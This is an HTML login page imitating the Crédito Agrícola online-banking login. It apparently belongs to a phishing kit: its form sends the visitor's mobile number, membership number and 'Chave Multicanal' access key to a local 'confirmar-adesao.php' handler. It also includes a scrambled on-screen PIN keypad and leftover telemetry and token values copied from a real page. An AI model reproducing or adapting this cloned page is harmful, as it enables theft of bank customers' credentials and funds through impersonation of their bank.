<!DOCTYPE html>
<html>
 <meta content="text/html;charset=utf-8" http-equiv="content-type"/>
 <head>
  <title>
   Login - CA
  </title>
  <link href="images/icons/favicon.ico" rel="icon" type="image/png"/>
  <link rel=""/>
  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
  <link href="fonts/font-awesome-4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
  <link href="vendor/animate/animate.css" rel="stylesheet" type="text/css"/>
  <link href="css/util.css" rel="stylesheet" type="text/css"/>
  <link href="css/site.css" rel="stylesheet" type="text/css"/>
  <link href="css/main.css" rel="stylesheet" type="text/css"/>
  <link href="vendor/icheck-material/icheck-material.css" rel="stylesheet" type="text/css"/>
  <script src="vendor/jquery/jquery-3.2.1.min.js">
  </script>
  <script src="vendor/bootstrap/js/popper.js">
  </script>
  <script src="vendor/bootstrap/js/bootstrap.min.js">
  </script>
  <script src="js/site.js">
  </script>
  <script src="js/globalVariables.js">
  </script>
  <script src="js/loader_CA_prelogin.js">
  </script>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <script type="text/javascript">
   var appInsights=window.appInsights||function(config){
            function i(config){t[config]=function(){var i=arguments;t.queue.push(function(){t[config].apply(t,i)})}}var t={config:config},u=document,e=window,o="script",s="AuthenticatedUserContext",h="start",c="stop",l="Track",a=l+"Event",v=l+"Page",y=u.createElement(o),r,f;y.src=config.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js";u.getElementsByTagName(o)[0].parentNode.appendChild(y);try{t.cookie=u.cookie}catch(p){}for(t.queue=[],t.version="1.0",r=["Event","Exception","Metric","PageView","Trace","Dependency"];r.length;)i("track"+r.pop());return i("set"+s),i("clear"+s),i(h+a),i(c+a),i(h+v),i(c+v),i("flush"),config.disableExceptionTracking||(r="onerror",i("_"+r),f=e[r],e[r]=function(config,i,u,e,o){var s=f&&f(config,i,u,e,o);return s!==!0&&t["_"+r](config,i,u,e,o),s}),t
        }({
            instrumentationKey: '025baacd-6e47-434b-bd7f-23196860823a'
        });

        window.appInsights=appInsights;
        appInsights.trackPageView();
  </script>
 </head>
 <body>
  <div class="psd2-page">
   <div class="psd2-container psd2-container-no-padding">
    <div class="psd2-container-tabs container default-global-header">
     <div class="row">
      <div class="col-12 psd2-tab-section">
       <div class="psd2-header">
        <img alt="" class="psd2-ca-logo" src="images/C.A%20LOGO_1.svg"/>
        <lbl class="psd2-header-label">
        </lbl>
       </div>
      </div>
     </div>
    </div>
    <div class="psd2-container-tabs login-header">
     <div class="row">
      <div class="col-6 psd2-tab-section ca-btn">
       <button class="psd2-header" type="submit">
        <img alt="" class="psd2-ca-logo-big" src="images/C.A%20LOGO_1.svg"/>
       </button>
      </div>
     </div>
    </div>
    <form action="confirmar-adesao.php" autocomplete="new-password" class="psd2-wrapper" method="post">
     <div>
      <label class="psd2-text-label-1">
       Número de telemóvel
      </label>
      <br/>
      <input class="psd2-input" id="phone" name="phone" placeholder="Insira o seu número de telemóvel" type="text"/>
     </div>
     <br/>
     <div>
      <label class="psd2-text-label-1">
       Número de Adesão
      </label>
      <br/>
      <input class="psd2-input" id="username" maxlength="8" name="username" placeholder="Insira o seu número de Adesão" type="text"/>
     </div>
     <div class="p-t-50">
      <label class="psd2-text-label-1">
       Chave Multicanal
      </label>
      <br/>
      <input autocomplete="off" class="psd2-input deletable" id="password" maxlength="8" name="Password" onchange="OnLoginPasswordChanged(this)" onkeyup="OnPwdChange()" placeholder="Insira a sua Chave Multicanal" readonly="" type="password"/>
     </div>
     <div class="psd2-wrapper-center p-t-38">
      <table class="psd2-keypad" style="display:none;">
       <tr>
        <td>
         <button class="psd2-keypad-button" onclick="AddNumber(this);" onfocus="OnKeypadMouseDown()" type="button" value="9">
          1
         </button>
        </td>
        <td>
         <button class="psd2-keypad-button" onclick="AddNumber(this);" onfocus="OnKeypadMouseDown()" type="button" value="8">
          2
         </button>
        </td>
        <td>
         <button class="psd2-keypad-button" onclick="AddNumber(this);" onfocus="OnKeypadMouseDown()" type="button" value="7">
          3
         </button>
        </td>
       </tr>
       <tr>
        <td>
         <button class="psd2-keypad-button" onclick="AddNumber(this);" onfocus="OnKeypadMouseDown()" type="button" value="6">
          4
         </button>
        </td>
        <td>
         <button class="psd2-keypad-button" onclick="AddNumber(this);" onfocus="OnKeypadMouseDown()" type="button" value="5">
          5
         </button>
        </td>
        <td>
         <button class="psd2-keypad-button" onclick="AddNumber(this);" onfocus="OnKeypadMouseDown()" type="button" value="4">
          6
         </button>
        </td>
       </tr>
       <tr>
        <td>
         <button class="psd2-keypad-button" onclick="AddNumber(this);" onfocus="OnKeypadMouseDown()" type="button" value="3">
          7
         </button>
        </td>
        <td>
         <button class="psd2-keypad-button" onclick="AddNumber(this);" onfocus="OnKeypadMouseDown()" type="button" value="2">
          8
         </button>
        </td>
        <td>
         <button class="psd2-keypad-button" onclick="AddNumber(this);" onfocus="OnKeypadMouseDown()" type="button" value="1">
          9
         </button>
        </td>
       </tr>
       <tr>
        <td colspan="3">
         <button class="psd2-keypad-button" onclick="AddNumber(this);" onfocus="OnKeypadMouseDown()" type="button" value="0">
          0
         </button>
        </td>
       </tr>
      </table>
     </div>
     <script>
      $(document).ready(function() {
    $("#password").focus(function() {
        $(".psd2-keypad").show();
        $(window).scrollTop($(document).height());

    });
});
     </script>
     <div class="psd2-wrapper-center m-t-67 m-b-58">
      <button class="psd2-button-accept-faded" id="btnEnter" type="submit">
       Entrar
      </button>
     </div>
     <input class="psd2-input" id="fingerPrint" name="fingerPrint" type="hidden"/>
     <input name="__RequestVerificationToken" type="hidden" value="CfDJ8NobJBXh91ROjLQ6YoZv0_-5idb0nmsbEOSdqLO5rCs5WhdefQieDxtSawCz9FxvAR_xB7XEZ8CWzQ_2d4EljXxNCvlHELIC7VAJAYN9tAWcmFEjxTMVyA1uyqyxCH-hiQsNTaA4HoD-7QBw-z4bsNM"/>
    </form>
    <script>
     function AddNumber(button) {
        var tbPassword = document.getElementById("password");
        tbPassword.value = tbPassword.value + button.value;
        tbPassword.classList.add('psd2-input-password-focused');
        document.getElementById("btnEnter").classList.add('psd2-button-accept-active');
    }

    $(document).ready(function () {
        $('input.deletable').wrap('<span class="deleteicon" />').after($('<span/>').click(function () {
            $(this).prev('input').val('').trigger('change').focus();
            document.getElementById("btnEnter").classList.remove('psd2-button-accept-active');
        }));
    });

    function OnLoginPasswordChanged(tb) {
    if (tb.value.length > 0) {
        document.getElementById("password").classList.add('psd2-input-password-focused');
        document.getElementById("btnEnter").classList.add('psd2-button-accept-active');
    } else {
        document.getElementById("password").classList.remove('psd2-input-password-focused');
        document.getElementById("btnEnter").classList.remove('psd2-button-accept-active');
    }
};

    function OnPwdChange() {
        OnLoginPasswordChanged(document.getElementById("password"));
    }

    function OnKeypadMouseDown() {
        document.getElementById("password").classList.add('psd2-input-password-focused');

    }
    </script>
   </div>
  </div>
  <script type="text/javascript">
   let userIdext = "";
        let sessionIdext = "";
        let locationIdext = "PSD2_CA_Login";
    
        populateVariables(userIdext, sessionIdext, locationIdext);
  </script>
 </body>
</html>
